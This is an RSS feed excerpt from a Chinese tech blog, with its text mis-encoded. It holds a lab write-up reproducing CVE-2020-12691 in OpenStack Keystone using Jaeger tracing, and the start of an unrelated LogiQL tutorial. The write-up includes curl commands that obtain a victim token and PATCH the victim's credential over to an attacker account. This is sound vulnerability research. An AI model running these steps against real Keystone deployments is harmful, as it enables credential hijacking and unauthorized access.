      <comments>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CVE-2020-12691 æ¼æ´åˆ©ç”¨ç›¸å…³ä¿¡æ¯è¿½è¸ª</title>
      <link>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/</link>
      <guid>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/</guid>
      <pubDate>Fri, 05 Nov 2021 07:25:15 GMT</pubDate>
      
      <description>ä½¿ç”¨ Jaeger å¯¹ Keystone è¿›è¡Œè¿½è¸ª</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>5.14 çš„æ—¶å€™å°±å†™å¥½äº†ï¼Œå°±æ˜¯ä¸€ç›´æ²¡å‘ï¼ˆæ‘Šæ‰‹</p><p>ä½¿ç”¨ Victoria ç‰ˆæœ¬çš„ Keystoneï¼ˆ<a href="https://tarballs.openstack.org/keystone/keystone-18.0.0.tar.gz">18.0.0</a>ï¼‰ä¸èƒ½å¤ç°æ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å¯ä»¥è·å–æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­æ‰€éœ€çš„ç›¸å…³ä¿¡æ¯ã€‚</p><ul><li>è¯¥æ¼æ´å¯ä»¥åœ¨ <a href="https://tarballs.openstack.org/keystone/keystone-16.0.0.tar.gz">Keystone 16.0.0</a> ä¸Šè¿›è¡Œåˆ©ç”¨</li></ul><p>è¯¥æ¼æ´çš„åŸç†æ˜¯ä½¿ç”¨å—å®³è€…çš„ X-Subject-Tokenã€credentialï¼Œå°†å…¶ credential å¯¹åº”çš„ user_idã€project_id æ›¿æ¢ä¸ºæ”»å‡»è€…çš„ï¼Œæ”»å‡»è€…å› æ­¤è·å¾—äº† credential çš„ä½¿ç”¨æƒï¼Œè¿›è€Œä½¿ç”¨è¯¥ credential è¯·æ±‚å—å®³è€…æ‰€æœ‰çš„èµ„æºã€‚æ¼æ´åˆ©ç”¨æ‰€éœ€çš„ä¿¡æ¯åŒ…æ‹¬ï¼š</p><ul><li>user_id</li><li>project_id</li><li>credential</li><li>X-Subject-Token</li></ul><h1 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h1><h2 id="ä»¤ç‰Œï¼ˆTokenï¼‰"><a href="#ä»¤ç‰Œï¼ˆTokenï¼‰" class="headerlink" title="ä»¤ç‰Œï¼ˆTokenï¼‰"></a>ä»¤ç‰Œï¼ˆTokenï¼‰</h2><p>ä¸€æ—¦ç”¨æˆ·çš„å‡­æ®ï¼ˆcredentialï¼‰é€šè¿‡éªŒè¯ï¼Œä»¤ç‰ŒæœåŠ¡éªŒè¯å’Œç®¡ç†ç”¨äºå‘èµ·æˆæƒè¯·æ±‚çš„ä»¤ç‰Œã€‚</p><p>ä¸‹å›¾æ˜¯è¯·æ±‚ token çš„æ—¶åºå›¾ï¼Œ<strong>åœ¨ v3 ç‰ˆæœ¬çš„ API ä¸­ï¼Œtoken åœ¨ HTTP å¤´éƒ¨çš„ X-Subject-Token å­—æ®µä¸­ï¼Œè€Œä¸”ä½œä¸º HTTP å¤´éƒ¨çš„ X-Auth-Token å­—æ®µï¼Œç”¨ä»¥å‘å…¶ä»–æœåŠ¡æä¾›è®¤è¯ã€‚</strong></p><img src="https://i.loli.net/2021/11/05/PMkbSVJxoEDevWm.png" width="80%"><h2 id="åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication-Credentialï¼‰"><a href="#åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication-Credentialï¼‰" class="headerlink" title="åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication Credentialï¼‰"></a>åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication Credentialï¼‰</h2><p>ç”¨æˆ·å¯ä»¥åˆ›å»ºåº”ç”¨å‡­æ®æ¥å…è®¸å…¶åº”ç”¨å‘ Keystone è¿›è¡Œè®¤è¯ï¼Œç”¨æˆ·å¯ä»¥å°†å…¶åœ¨é¡¹ç›®ä¸Šçš„è§’è‰²åˆ†é…çš„å­é›†å§”æ‰˜ç»™åº”ç”¨ç¨‹åºå‡­æ®ã€‚åº”ç”¨ä½¿ç”¨å‡­æ®ï¼ˆè€Œä¸æ˜¯ç”¨æˆ·åå¯†ç ï¼‰è¿›è¡Œèº«ä»½è®¤è¯ã€‚</p><p>EC2 credential å…è®¸ç”¨æˆ·é€šè¿‡ Amazon S3 API è®¿é—® OpenStack èµ„æºã€‚</p><h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>ä½¿ç”¨ Virtualbox è™šæ‹Ÿæœºå®‰è£… Ubuntu 18.04ï¼›ç„¶åå†å®‰è£… Docker å’Œ Jaeger ç›¸å…³çš„ Python åº“ã€‚</p><ol><li>å®‰è£… Docker</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€æœºå¯åŠ¨</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br></pre></td></tr></table></figure><ol start="2"><li>å®‰è£… Docker Composeï¼ˆè™½ç„¶æ²¡ç”¨åˆ°xdï¼‰</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.28.6/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><ol start="3"><li>ä½¿ç”¨ pip å®‰è£… Jaeger ç›¸å…³çš„åº“</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python åº“</span></span><br><span class="line">pip install jaeger_client</span><br><span class="line">pip install opentracing</span><br></pre></td></tr></table></figure><ol start="4"><li>å¯åŠ¨ all-in-one é•œåƒ</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‹‰å–é•œåƒ</span></span><br><span class="line">docker pull jaegertracing/all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®¹å™¨</span></span><br><span class="line">docker run -itd -p 6831:6831/udp -p 6832:6832/udp -p 16686:16686 jaegertracing/all-in-one</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>ä½¿ç”¨ admin ç”¨æˆ·æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œåˆ›å»ºå—å®³è€…ï¼ˆuser1ï¼‰å’Œæ”»å‡»è€…ï¼ˆuser2ï¼‰ç”¨æˆ·ï¼Œå¹¶ç»‘å®šè§’è‰²å’Œé¡¹ç›®ï¼Œæœ€åå„è‡ªç”Ÿæˆä¸€ä¸ª EC2 credential ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ—å‡ºè§’è‰²</span></span><br><span class="line">openstack role list</span><br><span class="line"><span class="comment"># åˆ›å»ºè§’è‰²</span></span><br><span class="line">openstack role create myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé¡¹ç›®åŠç”¨æˆ·</span></span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project1 --domain default</span><br><span class="line">openstack user create --project project1 --password password user1</span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project2 --domain default</span><br><span class="line">openstack user create --project project2 --password password user2</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç”¨æˆ·è§’è‰²</span></span><br><span class="line">openstack role add --user user1 --project project1 admin</span><br><span class="line">openstack role add --user user2 --project project2 myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹è§’è‰²åˆ†é…</span></span><br><span class="line">openstack role assignment list</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»º credential</span></span><br><span class="line">openstack ec2 credentials create --project project1 --user user1 --user-domain default --project-domain default</span><br><span class="line">openstack ec2 credentials create --project project2 --user user2 --user-domain default --project-domain default</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ credential</span></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>å¯¹ Keystone è¿›è¡Œ<strong>æ’æ¡©</strong>ï¼Œè¿½è¸ª <code>openstack credential list</code> çš„æ‰§è¡Œé“¾è·¯ã€‚å‘ç°åŒ…å«æ¼æ´åˆ©ç”¨æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä½†å¯¹åº”çš„ X-Subject-Token æ˜¯ admin ç”¨æˆ·çš„ã€‚</p><p>æ”¹ç”¨å±äº admin è§’è‰²çš„ user1 ç”¨æˆ·æ‰§è¡Œè¯¥æŒ‡ä»¤ï¼Œadmin è§’è‰²çš„ç”¨æˆ·å¯ä»¥æŸ¥çœ‹æ‰€æœ‰ credentialï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=user1</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=password</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=project1</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://127.0.0.1:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br><span class="line"></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>ï¼ˆuser1ï¼‰é™¤äº† X-Subject-Token ï¼Œè¿˜åŒ…å« user_idã€project_id</p><img src="https://i.loli.net/2021/11/05/e5yNWCf3OkQvLBJ.png" width="95%"><p>ï¼ˆuser1ï¼‰å¦ä¸€æ¡ trace ä¸­åŒ…å« credential ï¼Œæ ¹æ® user_id å’Œ project_id ï¼Œå¯ä»¥è¾¨è®¤å‡º user1 ç”¨æˆ·çš„ credential</p><img src="https://i.loli.net/2021/11/05/aypQeJtBGnWDIhd.png" width="95%"><p>ï¼ˆuser2ï¼‰èµ‹äºˆ myrole è§’è‰²çš„ user2 åªèƒ½çœ‹åˆ°è‡ªå·±çš„ credential ä¿¡æ¯</p><img src="https://i.loli.net/2021/11/05/Uogye3GNDs9YkZb.jpg" width="95%"><p>ï¼ˆuser2ï¼‰è¿½è¸ªä¿¡æ¯å’Œ user1 ç”¨æˆ·çš„ç›¸åŒï¼ŒåŒ…æ‹¬è‡ªå·±çš„ X-Subject-Tokenã€user_idã€project_id</p><img src="https://i.loli.net/2021/11/05/o6hbXtQHZegaN83.png"><p>ä»¥ä¸‹æ˜¯æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å– User1 çš„ X-Subject-Token</span></span><br><span class="line">curl -i -s\</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;user1&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;project&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;project1&quot;,</span></span><br><span class="line"><span class="string">        &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/auth/tokens?nocatalog&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– User1 çš„ credentialï¼ˆæ ¹æ® user_id å’Œ peoject_id æŸ¥æ‰¾ï¼‰</span></span><br><span class="line">curl \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials&quot;</span> | python -m json.tool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢ä¸º User2 çš„ user_idã€project_id</span></span><br><span class="line">curl -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;credential&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;project_id&quot;: &quot;b0419aebd03c40f3b8b0c413d19056ce&quot;,</span></span><br><span class="line"><span class="string">    &quot;user_id&quot;: &quot;6d173c8b8d354c0b8f890a0666821a64&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials/416f331f7a26867c8be1fe3c574b4878b09b58fd272b7ab60bb568b52deabdb9&quot;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦è·å¾—äº†å—å®³è€…çš„ X-Subject-Tokenã€credential ï¼Œå°±å¯ä»¥é€šè¿‡ PATCH è¯·æ±‚å°† credential å¯¹åº”çš„æ‰€æœ‰è€…æ›¿æ¢ä¸ºæ”»å‡»è€…çš„ã€‚</p><h1 id="Jaeger-API"><a href="#Jaeger-API" class="headerlink" title="Jaeger API"></a>Jaeger API</h1><p>è¿”å›è¿½è¸ªä¿¡æ¯ï¼Œä¿å­˜ä¸º json æ ¼å¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://jaeger-query:16686/api/traces/&#123;trace-id-hex-string&#125;</span></span><br><span class="line">curl <span class="string">&quot;http://localhost:16686/api/traces/a6192f3a980c57b5&quot;</span> -o 3.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> 3.json | python -mjson.tool</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>trace-id-hex-string</code> æ˜¯è·¯å¾„ä¸­å®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œä¸æ˜¯ Jaeger UI ä¸­çš„ç¼©ç•¥æ˜¾ç¤ºã€‚</p><img src="https://i.loli.net/2021/11/05/FpVlJZf72TtvEXi.png" width="80%"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ol><li><p>ä»å¤ç°æ¼æ´åˆ©ç”¨çš„è§’åº¦æ¥è¯´ï¼Œé“¾è·¯è¿½è¸ªå¯ä»¥è·å–åˆ°å¤§é‡çš„å¯ç”¨ä¿¡æ¯ï¼Œå¸®åŠ©æ„å»ºæ¼æ´åˆ©ç”¨è„šæœ¬ï¼›</p></li><li><p>ä»å‘ç°æ¼æ´çš„è§’åº¦æ¥è¯´ï¼Œé€šè¿‡é“¾è·¯è¿½è¸ªçš„åˆ°çš„æ•°æ®è¿›è¡Œåˆ†æï¼Œå¯èƒ½å‘ç°å¼‚å¸¸ã€‚</p><ul><li>ä¸Šè¿°æ¼æ´å¯ä»¥é€šè¿‡ä½¿ç”¨åŒä¸€ä¸ªç”¨æˆ·æ‰§è¡Œç›¸åŒæŒ‡ä»¤ï¼Œå¯¹æ¯”å‘ç°è¿”å›çš„ç»“æœä¸åŒã€‚å…·ä½“æ¥è¯´å°±æ˜¯æ¼æ´åˆ©ç”¨ä¹‹å‰å’Œä¹‹å <code>openstack credential list</code> è¿”å›çš„æ•°æ®ä¸ä¸€è‡´ï¼Œå› æ­¤å¯ä»¥æ¨æ–­è¿™é‡Œå¯èƒ½äº§ç”Ÿäº†å¼‚å¸¸ã€‚</li></ul></li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12691">CVE - CVE-2020-12691</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12691">NVD - CVE-2020-12691</a></li><li><a href="https://docs.docker.com/engine/install/ubuntu/">Install Docker Engine on Ubuntu</a></li><li><a href="https://docs.docker.com/engine/install/linux-postinstall/">Post-installation steps for Linux</a></li><li><a href="https://docs.docker.com/compose/install/">Install Docker Compose</a></li><li><a href="https://www.jaegertracing.io/docs/1.22/getting-started/">Getting Started â€“ Jaeger documentation</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Jaeger/">Jaeger</category>
      
      
      <category domain="https://jckling.github.io/tags/Python/">Python</category>
      
      
      <comments>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>LogiQL å…¥é—¨</title>
      <link>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/</link>
      <guid>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/</guid>
      <pubDate>Tue, 26 Oct 2021 08:15:05 GMT</pubDate>
      
      <description>30 åˆ†é’Ÿ LogicBlox REPL æ•™ç¨‹</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘çœ‹çš„å·¥å…·ä¸­ç”¨åˆ°äº† <a href="https://bitbucket.org/yanniss/doop/src/master/">Doop</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªä»¥ <strong>æŒ‡é’ˆåˆ†æ</strong> ç®—æ³•ä¸ºä¸­å¿ƒçš„ Java é™æ€åˆ†ææ¡†æ¶ï¼Œä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a> è§„åˆ™å½¢å¼è¡¨è¾¾çš„å„ç§åˆ†æçš„é›†åˆã€‚ç»´æŠ¤ä¸¤å¥—è§„åˆ™ï¼š</p><ul><li><a href="http://www.logicblox.com/">LogicBlox</a>ï¼šä½¿ç”¨ LogiQLï¼ŒDatalog ç¨‹åºçš„æ„å»ºå—ä»¥ <strong>è°“è¯</strong> çš„å½¢å¼å‡ºç°ï¼Œä¾‹å¦‚ <code>Person(&quot;John&quot;)</code>ã€<code>Parent(&quot;John&quot;, &quot;Johnny jr&quot;)</code>ï¼Œåˆ©ç”¨ <strong>è§„åˆ™</strong>ï¼ˆIDB é€»è¾‘ï¼‰ä»å·²çŸ¥çš„äº‹å®ä¸­æ¨æ–­å‡ºæ–°çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>Ancestor(x, y) &lt;- Parent(x, y)</code></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang&#x2F;souffle</a> (Systematic, Ontological, Undiscovered Fact Finding Logic Engine)ï¼šç”± Datalog å¯å‘çš„ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œå¯ç”¨äºé™æ€åˆ†æã€ç½‘ç»œåˆ†æå’Œæ•°æ®åˆ†æã€‚é»˜è®¤ä½¿ç”¨è¯¥å¼•æ“ã€‚</li></ul><p>æ²¡çœ‹åˆ°é»˜è®¤ç”¨çš„æ˜¯å¼€æºçš„ souffleï¼Œç»“æœèŠ±äº†ä¸€ä¸‹åˆå…¥é—¨ LogiQL è¿˜æœ‰æ‰¾ 3.10.x ç‰ˆæœ¬çš„ LogicBlox â€¦</p><p>LogicBlox ä¸€ç›´æ˜¯é—­æºè½¯ä»¶ï¼Œç›®å‰æœ€æ–°ç‰ˆæœ¬ 4.x.x éƒ½å¯ä»¥ä¸‹è½½ï¼Œ<a href="https://developer.logicblox.com/release-archive-310/">Release Archive (LB 3.10.x)</a> ä¸å†æä¾›ä¸‹è½½ï¼Œå¯ä»¥é€šè¿‡ <a href="https://developer.logicblox.com/logicblox-academic-license-request/">LogicBlox Academic License Request</a> ç”³è¯·ã€‚æ‰¾äº†å¥½ä¹…æ²¡åœ°æ–¹ä¸‹è½½è¿˜è¦ç”³è¯·ï¼Œå›å¤´ä»”ç»†çœ‹äº†çœ‹ Doop çš„è¯´æ˜æ–‡æ¡£æ‰å‘ç°åº”è¯¥å»çœ‹ souffle ğŸ˜…ğŸ˜…ğŸ˜…</p><p>LogiQL å…¥é—¨è·Ÿç€æ•™ç¨‹ <a href="https://developer.logicblox.com/content/docs4/tutorial/repl/section/split.html">LogiQL in 30 minutes</a> èµ°å°±å¥½äº†ï¼Œä»‹ç»çš„ç‰¹åˆ«ç®€å•ï¼Œèƒ½å¤Ÿè®©äººåˆšè¸©åˆ°é—¨æ§›ä¸Šå§ï¼ˆå¤§æ¦‚ï¼‰ã€‚</p><h1 id="0x01-LogiQL-å…¥é—¨"><a href="#0x01-LogiQL-å…¥é—¨" class="headerlink" title="0x01 LogiQL å…¥é—¨"></a>0x01 LogiQL å…¥é—¨</h1><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>ç”¨åœ¨çº¿çš„ <a href="https://repl.logicblox.com/">LogicBlox REPL (Read-Eval-Print Loop)</a> è¿›è¡Œå®éªŒï¼ŒREPL æ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤çš„äº¤äº’å¼ç¯å¢ƒï¼Œå¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œ LogiQL å‘½ä»¤å¹¶ç«‹å³æ£€æŸ¥ç»“æœã€‚</p><h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><p>å·¥ä½œåŒºï¼ˆworkspaceï¼‰æŒ‡ä»£æ•°æ®åº“ï¼ˆdatabaseï¼‰ï¼Œç»“åˆäº†æ¨¡å¼ï¼ˆschemaï¼‰ã€é€»è¾‘ï¼ˆlogicï¼‰å’Œæ•°æ®ï¼ˆdataï¼‰</p><h2 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h2><p>å®šä¹‰ä¸€ä¸ªå†°æ·‡æ·‹å•†åº—ä¼šè®¡ç³»ç»Ÿï¼Œè®°å½•ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li>æˆæœ¬ï¼ˆäººå·¥ï¼ŒåŸæ–™ï¼‰ï¼šcost(labor, ingredients)</li><li>ä»·æ ¼ï¼šprice</li><li>é”€é‡&#x2F;å‘¨ï¼šsales</li><li>æ¯ä¸ªå†°æ·‡æ·‹çš„æ”¶å…¥&#x2F;å‘¨ï¼šrevenue</li><li>æ‰€æœ‰å†°æ·‡æ·‹çš„æ”¶å…¥&#x2F;å‘¨ï¼šweek 